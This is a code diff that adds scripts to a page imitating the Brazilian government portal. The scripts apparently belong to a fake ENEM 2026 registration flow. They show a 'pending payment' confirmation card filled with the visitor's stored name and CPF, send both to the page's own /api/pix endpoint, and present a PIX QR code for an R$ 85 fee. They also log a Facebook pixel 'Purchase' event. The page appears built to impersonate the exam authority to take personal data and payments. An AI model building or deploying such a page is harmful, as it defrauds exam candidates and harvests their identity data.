+        d.innerHTML='<div style="color:#888;font-size:7px;margin-bottom:1px;">'+label+'</div><div style="font-weight:700;font-size:9px;color:#111;word-break:break-word;">'+valor+'</div>';
+        return d;
+      }
+
+      // Header
+      var hdr=document.createElement('div');
+      hdr.style.cssText='background:#1a3d8f;display:flex;align-items:center;justify-content:space-between;padding:5px 8px;';
+      hdr.innerHTML=
+        '<div style="color:rgba(255,255,255,0.4);font-weight:900;font-size:6px;line-height:1.4;letter-spacing:1px;">enem enem<br>enem enem<br>enem enem</div>'+
+        '<div style="color:#fff;font-size:9px;font-weight:700;text-align:center;line-height:1.3;">CARTÃO DE<br>CONFIRMAÇÃO</div>'+
+        '<div style="background:#fff;border-radius:3px;padding:2px 5px;text-align:center;">'+
+          '<div style="color:#1a3d8f;font-weight:900;font-size:11px;line-height:1;">enem</div>'+
+          '<div style="color:#1a3d8f;font-size:7px;font-weight:700;line-height:1;">2026</div>'+
+        '</div>';
+      card.appendChild(hdr);
+
+      // Pendente banner
+      var pendente=document.createElement('div');
+      pendente.style.cssText='background:#d84315;color:#fff;text-align:center;padding:5px;font-size:10px;font-weight:900;letter-spacing:0.5px;';
+      pendente.textContent='PENDENTE / AGUARDANDO PAGAMENTO';
+      card.appendChild(pendente);
+
+      // Dados
+      card.appendChild(secTitle('DADOS DO PARTICIPANTE'));
+      var dadosWrap=document.createElement('div');
+      dadosWrap.style.cssText='padding:5px 8px;display:grid;grid-template-columns:1fr 1fr;gap:5px;';
+
+      var nomeDiv=document.createElement('div');
+      nomeDiv.style.cssText='grid-column:1/-1;';
+      nomeDiv.innerHTML='<div style="color:#888;font-size:7px;margin-bottom:1px;">NOME COMPLETO:</div><div style="font-weight:700;font-size:9px;color:#111;">'+nome+'</div>';
+      dadosWrap.appendChild(nomeDiv);
+
+      dadosWrap.appendChild(campo('CPF:',cpf));
+      dadosWrap.appendChild(campo('LÍNGUA ESTRANGEIRA:',idioma.toUpperCase()));
+
+      var inscDiv=document.createElement('div');
+      inscDiv.style.cssText='grid-column:1/-1;';
+      inscDiv.innerHTML='<div style="color:#888;font-size:7px;margin-bottom:1px;">Nº DE INSCRIÇÃO:</div><div style="font-weight:700;font-size:9px;color:#111;">PENDENTE</div>';
+      dadosWrap.appendChild(inscDiv);
+
+      card.appendChild(dadosWrap);
+
+      // Datas
+      card.appendChild(secTitle('DATAS E HORÁRIOS'));
+      var datas=document.createElement('div');
+      datas.style.cssText='padding:5px 8px;display:flex;flex-direction:column;gap:4px;';
+
+      function diaRow(dia, data, termino){
+        var row=document.createElement('div');
+        row.style.cssText='display:flex;align-items:center;gap:6px;font-size:8px;';
+        row.innerHTML=
+          '<div style="background:#1a3d8f;color:#fff;font-weight:700;padding:2px 5px;border-radius:3px;white-space:nowrap;">'+dia+'</div>'+
+          '<div style="color:#333;flex:1;">'+data+'</div>'+
+          '<div style="color:#555;white-space:nowrap;">13h30–'+termino+'</div>';
+        return row;
+      }
+      datas.appendChild(diaRow('1º DIA','08/11/2026','19h00'));
+      datas.appendChild(diaRow('2º DIA','15/11/2026','18h30'));
+      card.appendChild(datas);
+
+      // Local
+      card.appendChild(secTitle('LOCAL DAS PROVAS'));
+      var localWrap=document.createElement('div');
+      localWrap.style.cssText='padding:5px 8px;display:grid;grid-template-columns:1fr 1fr;gap:5px;';
+      localWrap.appendChild(campo('ESTADO:',estado));
+      localWrap.appendChild(campo('CIDADE:',cidade));
+      var localFull=document.createElement('div');
+      localFull.style.cssText='grid-column:1/-1;';
+      localFull.appendChild(campo('LOCAL / SALA:','A informar após o pagamento'));
+      localWrap.appendChild(localFull);
+      card.appendChild(localWrap);
+
+      return card;
+    }
+
+    function mostrarConfirmacao(ancorEl){
+      if(!ancorEl||!ancorEl.parentElement) return;
+
+      var dadosGov;
+      try { dadosGov=JSON.parse(sessionStorage.getItem('gov_dados')||'null'); } catch(e){}
+      var nome = dadosGov&&dadosGov.nome ? dadosGov.nome : '—';
+      var cpf  = dadosGov&&dadosGov.cpf  ? dadosGov.cpf.replace(/\D/g,'').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4') : '—';
+
+      var loadingEl=criarBalao(
+        '<div style="display:flex;gap:7px;align-items:center;padding:4px 2px;">'+
+          '<span style="width:9px;height:9px;border-radius:50%;background:#888;display:inline-block;animation:_dot 1s infinite 0s;"></span>'+
+          '<span style="width:9px;height:9px;border-radius:50%;background:#888;display:inline-block;animation:_dot 1s infinite .2s;"></span>'+
+          '<span style="width:9px;height:9px;border-radius:50%;background:#888;display:inline-block;animation:_dot 1s infinite .4s;"></span>'+
+        '</div>'
+      );
+      ancorEl.parentElement.insertBefore(loadingEl, ancorEl.nextSibling);
+      setTimeout(function(){ loadingEl.scrollIntoView({behavior:'smooth',block:'end'}); }, 80);
+
+      setTimeout(function(){
+        var msg=criarBalao(
+          '<p style="margin:0 0 6px;">Confira seus dados abaixo!</p>'+
+          '<p style="margin:0 0 6px;">Para concluir sua inscrição, realize o pagamento da taxa de inscrição de <b>R$&nbsp;85,00</b>.</p>'+
+          '<p style="margin:0 0 10px;">O local de realização da prova e a sala serão informados após a confirmação do pagamento.</p>'
+        );
+        ancorEl.parentElement.replaceChild(msg, loadingEl);
+
+        // Injeta o cartão dentro do próprio balão (bWrap > bubble = children[1].children[1])
+        var bubble = msg.children[1] && msg.children[1].children[1];
+        var card=criarCardConfirmacao(nome, cpf, estadoSelecionado, cidadeSelecionada, idiomasSelecionado||'—');
+        if(bubble) bubble.appendChild(card);
+
+        ultimoBalao=msg;
+        btn.disabled=false;
+        btn.style.background='#1351b4';
+        btn.textContent='Realizar Pagamento';
+        setTimeout(function(){ msg.scrollIntoView({behavior:'smooth',block:'start'}); }, 80);
+      }, 1800);
+    }
+
+    function mostrarPagamentoPix(ancorEl){
+      if(!ancorEl||!ancorEl.parentElement) return;
+
+      var loadingEl = criarBalao(
+        '<div style="display:flex;gap:7px;align-items:center;padding:4px 2px;">' +
+          '<span style="width:9px;height:9px;border-radius:50%;background:#888;display:inline-block;animation:_dot 1s infinite 0s;"></span>' +
+          '<span style="width:9px;height:9px;border-radius:50%;background:#888;display:inline-block;animation:_dot 1s infinite .2s;"></span>' +
+          '<span style="width:9px;height:9px;border-radius:50%;background:#888;display:inline-block;animation:_dot 1s infinite .4s;"></span>' +
+        '</div>'
+      );
+      ancorEl.parentElement.insertBefore(loadingEl, ancorEl.nextSibling);
+      setTimeout(function(){ loadingEl.scrollIntoView({behavior:'smooth',block:'end'}); }, 80);
+
+      var dadosGov;
+      try { dadosGov = JSON.parse(sessionStorage.getItem('gov_dados')||'null'); } catch(e){}
+      var nomePag = dadosGov&&dadosGov.nome ? dadosGov.nome : 'Participante';
+      var cpfPag  = dadosGov&&dadosGov.cpf  ? dadosGov.cpf  : '';
+
+      fetch('/api/pix', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ nome: nomePag, cpf: cpfPag })
+      })
+      .then(function(res){ return res.json(); })
+      .then(function(data){
+        if(loadingEl.parentElement) loadingEl.parentElement.removeChild(loadingEl);
+
+        if(data && data.qr_code){
+          var balao = criarBalao(
+            '<p style="margin:0 0 8px;font-weight:700;">Pagamento gerado com sucesso!</p>' +
+            '<p style="margin:0 0 8px;">Escaneie o QR Code ou copie o código PIX abaixo para pagar a taxa de inscrição de <b>R$&nbsp;85,00</b>:</p>'
+          );
+          var bubble = balao.children[1] && balao.children[1].children[1];
+          if(bubble){
+            var qrImg = document.createElement('img');
+            var qrSrc = data.qr_code;
+            if(qrSrc && !qrSrc.startsWith('http') && !qrSrc.startsWith('data:')) {
+              qrSrc = 'data:image/png;base64,' + qrSrc;
+            }
+            qrImg.src = qrSrc;
+            qrImg.style.cssText = 'width:190px;height:190px;display:block;margin:10px auto;border:1px solid #ddd;border-radius:6px;';
+            bubble.appendChild(qrImg);
+
+            var pixLabel = document.createElement('p');
+            pixLabel.style.cssText = 'margin:8px 0 4px;font-size:12px;font-weight:700;';
+            pixLabel.textContent = 'Código PIX (Copia e Cola):';
+            bubble.appendChild(pixLabel);
+
+            var pixBox = document.createElement('div');
+            pixBox.style.cssText = 'background:#f0f0f0;border:1px solid #ccc;border-radius:6px;padding:8px 10px;font-size:10px;word-break:break-all;color:#333;margin-bottom:8px;line-height:1.4;';
+            pixBox.textContent = data.qr_code_text;
+            bubble.appendChild(pixBox);
+
+            var copyBtn = document.createElement('button');
+            copyBtn.id = 'btn-copiar-pix';
+            copyBtn.textContent = 'Copiar código PIX';
+            copyBtn.style.cssText = 'width:100%;background:#1351b4;color:#fff;font-size:14px;font-weight:700;border:none;border-radius:6px;padding:12px;cursor:pointer!important;font-family:Arial,sans-serif;margin-bottom:8px;';
+            copyBtn.addEventListener('click', function(e){
+              e.stopPropagation();
+              var texto = data.qr_code_text;
+              function fallbackCopy(t){
+                var ta = document.createElement('textarea');
+                ta.value = t;
+                ta.style.cssText = 'position:fixed;top:-9999px;left:-9999px;';
+                document.body.appendChild(ta);
+                ta.focus(); ta.select();
+                try {
+                  document.execCommand('copy');
+                  copyBtn.textContent = '✓ Copiado!'; copyBtn.style.background = '#168821';
+                  setTimeout(function(){ copyBtn.textContent='Copiar código PIX'; copyBtn.style.background='#1351b4'; }, 2500);
+                } catch(_){}
+                document.body.removeChild(ta);
+              }
+              if(navigator.clipboard && navigator.clipboard.writeText){
+                navigator.clipboard.writeText(texto).then(function(){
+                  copyBtn.textContent = '✓ Copiado!'; copyBtn.style.background = '#168821';
+                  setTimeout(function(){ copyBtn.textContent='Copiar código PIX'; copyBtn.style.background='#1351b4'; }, 2500);
+                }).catch(function(){ fallbackCopy(texto); });
+              } else {
+                fallbackCopy(texto);
+              }
+            });
+            bubble.appendChild(copyBtn);
+
+            var expP = document.createElement('p');
+            expP.style.cssText = 'margin:0;font-size:11px;color:#888;text-align:center;';
+            expP.textContent = 'O QR Code expira em 30 minutos. Após o pagamento, sua inscrição será confirmada automaticamente.';
+            bubble.appendChild(expP);
+          }
+
+          ancorEl.parentElement.insertBefore(balao, ancorEl.nextSibling);
+          ultimoBalao = balao;
+          btn.style.display = 'none';
+          cover.style.display = 'none';
+          if(typeof fbq === 'function') fbq('track', 'Purchase', {value: 85.00, currency: 'BRL'});
+          setTimeout(function(){ balao.scrollIntoView({behavior:'smooth',block:'start'}); }, 80);
+        } else {
+          var errMsg = (data && data.message) ? data.message : 'Erro ao gerar o PIX.';
+          var errBalao = criarBalao(
+            '<p style="margin:0 0 6px;color:#c62828;font-weight:700;">Erro ao gerar pagamento</p>' +
+            '<p style="margin:0;font-size:13px;">'+errMsg+'</p>'
+          );
+          ancorEl.parentElement.insertBefore(errBalao, ancorEl.nextSibling);
+          ultimoBalao = errBalao;
+          estagio = 8;
+          btn.disabled = false; btn.style.background = '#1351b4'; btn.textContent = 'Tentar novamente';
+          setTimeout(function(){ errBalao.scrollIntoView({behavior:'smooth',block:'start'}); }, 80);
+        }
+      })
+      .catch(function(){
+        if(loadingEl.parentElement) loadingEl.parentElement.removeChild(loadingEl);
+        var errBalao = criarBalao(
+          '<p style="margin:0 0 6px;color:#c62828;font-weight:700;">Erro de conexão</p>' +
+          '<p style="margin:0;font-size:13px;">Não foi possível conectar ao servidor de pagamento. Verifique sua conexão e tente novamente.</p>'
+        );
+        ancorEl.parentElement.insertBefore(errBalao, ancorEl.nextSibling);
+        ultimoBalao = errBalao;
+        estagio = 8;
+        btn.disabled = false; btn.style.background = '#1351b4'; btn.textContent = 'Tentar novamente';
+        setTimeout(function(){ errBalao.scrollIntoView({behavior:'smooth',block:'start'}); }, 80);
+      });
+    }
+
+    document.body.appendChild(btn);
+  }
+
+  document.addEventListener('DOMContentLoaded',function(){
+    modificar();
+    var obs = new MutationObserver(function(){
+      if(!feito.texto||!feito.botao||!feito.input) modificar();
+    });
+    obs.observe(document.body,{childList:true,subtree:true});
+  });
+})();
+</script><script>
+(function(){
+  var dados;
+  try { dados = JSON.parse(sessionStorage.getItem('gov_dados')||'null'); } catch(e){}
+  if(!dados||!dados.nome) return;
+
+  function fmtCPF(c){
+    c=c.replace(/\D/g,'');
+    return c.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');
+  }
+
+  function injetar(){
+    if(document.getElementById('gov-credenciais')) return;
+    var div=document.createElement('div');
+    div.id='gov-credenciais';
+    div.style.cssText=[
+      'position:fixed',
+      'bottom:60px',
+      'left:0',
+      'padding:4px 12px',
+      'z-index:99999',
+      'pointer-events:none',
+      'line-height:1.35'
+    ].join(';');
+    div.innerHTML=
+      '<div style="font-size:13px;font-weight:700;color:#1a1a1a;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:240px;">'+dados.nome+'</div>'+
+      '<div style="font-size:12px;color:#555;">'+fmtCPF(dados.cpf||'')+'</div>';
+    document.body.appendChild(div);
+  }
+
+  document.addEventListener('DOMContentLoaded',function(){
+    injetar();
+    new MutationObserver(injetar).observe(document.body,{childList:true,subtree:false});
+  });
+})();
+</script></head><body><div id="barra-brasil" style="background:#7f7f7f;height:20px;padding:0 0 0 10px;display:block;max-width:100vw"><ul id="menu-barra-temp" style="list-style:none"><li style="display:inline;padding-right:10px;margin-right:10px;border-right:1px solid #ededed"><a href="http://brasil.gov.br" style="font-family:sans,sans-serif;text-decoration:none;color:#fff">Portal do Governo Brasileiro</a></li></ul></div><noscript>You need to enable JavaScript to run this app.</noscript><div id="root"></div><script defer="defer" src="js/barra_2.0.js" type="text/javascript"></script><script>!function(l){function e(e){for(var r,t,n=e[0],o=e[1],u=e[2],f=0,i=[];f<n.length;f++)t=n[f],p[t]&&i.push(p[t][0]),p[t]=0;for(r in o)Object.prototype.hasOwnProperty.call(o,r)&&(l[r]=o[r]);for(s&&s(e);i.length;)i.shift()();return c.push.apply(c,u||[]),a()}function a(){for(var e,r=0;r<c.length;r++){for(var t=c[r],n=!0,o=1;o<t.length;o++){var u=t[o];0!==p[u]&&(n=!1)}n&&(c.splice(r--,1),e=f(f.s=t[0]))}return e}var t={},p={1:0},c=[];function f(e){if(t[e])return t[e].exports;var r=t[e]={i:e,l:!1,exports:{}};return l[e].call(r.exports,r,r.exports,f),r.l=!0,r.exports}f.m=l,f.c=t,f.d=function(e,r,t){f.o(e,r)||Object.defineProperty(e,r,{enumerable:!0,get:t})},f.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},f.t=function(r,e){if(1&e&&(r=f(r)),8&e)return r;if(4&e&&"object"==typeof r&&r&&r.__esModule)return r;var t=Object.create(null);if(f.r(t),Object.defineProperty(t,"default",{enumerable:!0,value:r}),2&e&&"string"!=typeof r)for(var n in r)f.d(t,n,function(e){return r[e]}.bind(null,n));return t},f.n=function(e){var r=e&&e.__esModule?function(){return e.default}:function(){return e};return f.d(r,"a",r),r},f.o=function(e,r){return Object.prototype.hasOwnProperty.call(e,r)},f.p="./";var r=window.webpackJsonp=window.webpackJsonp||[],n=r.push.bind(r);r.push=e,r=r.slice();for(var o=0;o<r.length;o++)e(r[o]);var s=n;a()}([])</script><script src="js/2.22b062da.chunk.js"></script><script src="js/main.8507e954.chunk.js"></script></body></html>
